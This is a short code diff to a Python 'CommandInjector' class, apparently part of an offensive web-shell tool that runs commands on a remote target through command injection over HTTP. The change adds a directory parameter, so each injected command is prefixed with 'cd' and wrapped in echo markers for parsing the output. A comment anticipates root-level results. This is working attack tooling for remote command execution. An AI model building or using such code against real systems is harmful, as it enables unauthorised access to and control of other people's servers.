@@ -43,9 +43,10 @@ class CommandInjector:
 
         self.command_placeholder = command_placeholder
 
-    def execute(self, cmd: str) -> str:
+    def execute(self, cmd: str, directory: str = ".") -> str:
         """ Execute the specified command on the target
         :param cmd: the command to execute
+        :param directory: the remote directory where to execute the command
         :return: the output of the command from the target
         :raise :class:`requests.exceptions.RequestException` in case of connection errors
         :raise :class:`requests.excptions.Timeout` in case of timeout expiration
@@ -63,6 +64,9 @@ class CommandInjector:
         #   uid=0(root) gid=0(root) groups=0(root)
         #
         placeholder = hashlib.md5(f"wshell-{random.random()}".encode("utf-8")).hexdigest()
+        # To make `cd` command works over HTTP shell we need to change to the desired directory
+        # before the execution of every command
+        cmd = f"cd {directory}{self.COMMAND_DELIMITER}{cmd}"
         cmd = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder}"
 
         # We don't know where the command placeholder is, so just try to resolve it anywhere
